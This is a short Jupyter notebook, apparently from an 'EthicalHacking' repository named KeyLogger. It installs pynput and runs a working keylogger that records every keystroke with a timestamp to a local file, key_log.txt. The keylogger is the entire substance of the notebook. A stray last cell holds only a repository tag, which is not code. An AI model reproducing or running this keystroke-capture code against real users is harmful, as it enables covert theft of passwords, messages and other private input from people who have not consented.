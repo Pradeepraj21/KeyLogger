{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14cdf15e",
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7cefd5f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "# if no name it gets into an empty string\n",
    "log_dir = \"\"\n",
    "# This is a basic logging function\n",
    "logging.basicConfig(filename=(log_dir+\"key_log.txt\"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')\n",
    "# This is from the library\n",
    "def on_press(key):\n",
    "\tlogging.info(str(key))\n",
    "# This says, listener is on\n",
    "with Listener(on_press=on_press) as listener:\n",
    "\tlistener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a6e2a01",
   "metadata": {},
   "outputs": [],
   "source": [
    "pradeepraj21 EthicalHacking"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
